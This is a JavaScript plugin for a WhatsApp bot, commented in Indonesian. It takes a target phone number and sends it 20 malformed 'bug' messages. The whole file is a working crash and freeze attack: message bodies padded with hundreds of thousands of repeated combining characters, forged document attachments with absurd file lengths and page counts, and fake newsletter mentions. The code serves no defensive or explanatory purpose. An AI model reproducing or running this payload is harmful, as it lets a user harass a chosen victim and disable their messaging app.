let handler = async (m, { conn, text, usedPrefix, command }) => {
    if (!text) throw `*Cara penggunaan:*

${usedPrefix + command} nomor

*Contoh:* ${usedPrefix + command} 6281234567890`;

    // Ekstrak nomor tujuan
    let bugtarg = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    let data = (await conn.onWhatsApp(bugtarg))[0] || {};

    if (!data.exists) throw 'Nomor tidak terdaftar di WhatsApp.';

    // Loop untuk spam sebanyak 20 kali
    for (let i = 0; i < 20; i++) {
        // Pilih tipe bug yang akan dikirim
        const bugType = Math.floor(Math.random() * 3); // Random antara 0-2
        switch (bugType) {
            case 0:
                await locasifreeze(conn, bugtarg);
                break;
            case 1:
                await uidoc3(conn, bugtarg);
                break;
            case 2:
                await uidoc(conn, bugtarg);
                break;
        }
    }

    // Konfirmasi
    m.reply(`Berhasil mengirim spam bug ke nomor ${text} sebanyak 20 kali.`);
};

// Fungsi locasifreeze
async function locasifreeze(conn, bugtarg) {
    await conn.relayMessage(
        bugtarg,
        {
            groupMentionedMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            locationMessage: {
                                degreesLatitude: 0,
                                degreesLongitude: 0,
                            },
                            hasMediaAttachment: true,
                        },
                        body: {
                            text: "ArFur117" + "ꦾ".repeat(295000),
                        },
                        nativeFlowMessage: {},
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: " xCeZeT " }],
                        },
                    },
                },
            },
        },
        { participant: { jid: bugtarg } },
        { messageId: null }
    );
}

// Fungsi uidoc3
async function uidoc3(conn, bugtarg) {
    let akumw = "Hehehe" + "ꦿꦾ꧀".repeat(50000);
    await conn.relayMessage(
        bugtarg,
        {
            groupMentionedMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            documentMessage: {
                                url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "999999999",
                                pageCount: 0x9184e729fff,
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: " TrashDex Explanation ",
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                mediaKeyTimestamp: "1715880173",
                                contactVcard: true,
                            },
                            title: "",
                            hasMediaAttachment: true,
                        },
                        body: {
                            text: akumw,
                        },
                        nativeFlowMessage: {},
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Solid Solid Solid" }],
                        },
                    },
                },
            },
        },
        { participant: { jid: bugtarg } },
        { messageId: null }
    );
}

// Fungsi uidoc
async function uidoc(conn, bugtarg) {
    let uitext = "𝘼𝙩𝙩𝙖𝙘𝙠 𝙐𝙞" + "꧀".repeat(5000);
    await conn.relayMessage(
        bugtarg,
        {
            groupMentionedMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            documentMessage: {
                                url: 'https://mmg.whatsapp.net/v/t62.7119-24/19392659_857576149596887_4268823484878612019_n.enc?ccb=11-4&oh=01_Q5AaIOQvG2wK688SyUp4JFWqGXhBQT6m5vUcvS2aBi0CXMTv&oe=676AAEC6&_nc_sid=5e03e0&mms3=true',
                                mimetype: 'application/pdf',
                                fileSha256: "NpR4V+tVc+N2p3zZgKO9Zzo/I7LrhNHlJxyDBxsYJLo=",
                                fileLength: "999999999",
                                pageCount: 0x9184e729fff,
                                mediaKey: "6l+ksifBQsLHuJJGUs5klIE98Bv7usMDwGm4JF2rziw=",
                                fileName: "Ampas Njir",
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: '/v/t62.7119-24/19392659_857576149596887_4268823484878612019_n.enc?ccb=11-4&oh=01_Q5AaIOQvG2wK688SyUp4JFWqGXhBQT6m5vUcvS2aBi0CXMTv&oe=676AAEC6&_nc_sid=5e03e0',
                                mediaKeyTimestamp: "1715880173",
                                contactVcard: true,
                            },
                            title: "",
                            hasMediaAttachment: true,
                        },
                        body: {
                            text: uitext,
                        },
                        nativeFlowMessage: {},
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: " Arfur117 " }],
                        },
                    },
                },
            },
        },
        { participant: { jid: bugtarg } },
        { messageId: null }
    );
}

handler.command = /^(bug|kill|dor|byebye)$/i
handler.tags = ['tools'];
handler.help = ['bug <nomor>'];
handler.owner = true;

export default handler;
